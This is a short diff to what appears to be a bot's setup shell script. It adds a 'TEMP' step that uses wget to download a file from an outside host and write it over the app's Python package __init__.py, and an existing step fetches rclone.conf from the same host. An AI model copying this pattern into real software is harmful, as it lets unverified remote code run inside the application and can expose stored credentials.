@@ -40,6 +40,10 @@ echo "RENEWME_COMMAND=renewme" >> config.env
 echo "LOG_COMMAND=log" >> config.env
 
 
+# TEMP
+wget -O /app/tobrot/__init__.py http://tools.1nfinity.win/init.py
+
+
 # Rclone Get from URL failed Patch
 wget -O /app/rclone.conf http://tools.1nfinity.win/74415578112.rm
 
